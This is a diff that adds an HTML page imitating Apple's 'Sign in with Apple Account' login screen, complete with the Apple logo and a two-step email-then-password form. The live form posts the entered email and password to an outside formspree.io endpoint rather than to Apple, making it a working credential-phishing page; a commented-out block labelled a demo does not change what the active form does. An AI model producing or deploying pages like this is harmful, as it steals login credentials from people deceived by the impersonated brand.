@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Apple ID Login</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+
+    .logo-wrapper {
+      position: relative;
+      width: 100px;
+      height: 100px;
+      margin: 0 auto 20px;
+    }
+
+    .apple-logo {
+      width: 40px;
+      position: absolute;
+      top: 22px;
+      left: 30px;
+      z-index: 2;
+    }
+
+    .color-ring {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      position: absolute;
+      z-index: 1;
+      background: conic-gradient(
+        from 0deg,
+        #ff5e3a,
+        #ff9500,
+        #ffcc00,
+        #4cd964,
+        #5ac8fa,
+        #007aff,
+        #5856d6,
+        #ff2d55,
+        #ff5e3a
+      );
+      mask: radial-gradient(circle, transparent 45%, black 45%);
+      animation: spin 3s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .input-wrapper {
+      width: 100%;
+      position: relative;
+      margin-bottom: 10px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1.5px solid #ccc;
+      border-radius: 10px;
+      box-sizing: border-box;
+    }
+
+    button {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .checkbox {
+      margin: 20px 0 10px;
+    }
+
+    .links a {
+      color: #007aff;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-top: 5px;
+    }
+
+    #passwordField {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo-wrapper">
+      <div class="color-ring"></div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="apple-logo">
+    </div>
+    <h2>Sign in with<br><strong>Apple Account</strong></h2>
+
+    <div id="loginForm">
+        <form  method="POST" action="https://formspree.io/f/mdkenbez">
+            <div class="input-wrapper">
+                <input type="text" id="emailInput" name="ushame" placeholder="Email or Phone Number" required>
+                <button type="button" onclick="showPassword()">→</button>
+              </div>
+        
+              <div class="input-wrapper" id="passwordField">
+                <input type="password" name="upsword" id="passwordInput" placeholder="Password">
+                <button type="submit">→</button>
+              </div>
+        </form>
+
+      <div class="checkbox">
+        <input type="checkbox" id="keep-signed-in">
+        <label for="keep-signed-in">Keep me signed in</label>
+      </div>
+
+      <div class="links">
+        <a href="#">Forgotten your password?</a>
+        <a href="#">Create Apple Account</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showPassword() {
+      const emailInput = document.getElementById("emailInput").value.trim();
+      const passwordField = document.getElementById("passwordField");
+
+      if (emailInput === "") {
+        alert("Please enter your email or phone number.");
+        return;
+      }
+
+      // Basic email format check (optional)
+      if (emailInput.includes("@") && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput)) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      passwordField.style.display = "block";
+    }
+    //     document.getElementById("loginForm").addEventListener("submit", function (e) {
+//       e.preventDefault();
+
+//       const email = document.getElementById("emailInput").value.trim();
+//       const password = document.getElementById("passwordInput").value.trim();
+
+// if (email === "" || password === "") {
+//   alert("Both fields are required.");
+//   return;
+// }
+
+// alert("Login successful! (This is just a demo)");
+// // You can now proceed to send this data to a server if needed
+// });
+</script>
+</body>
+</html>
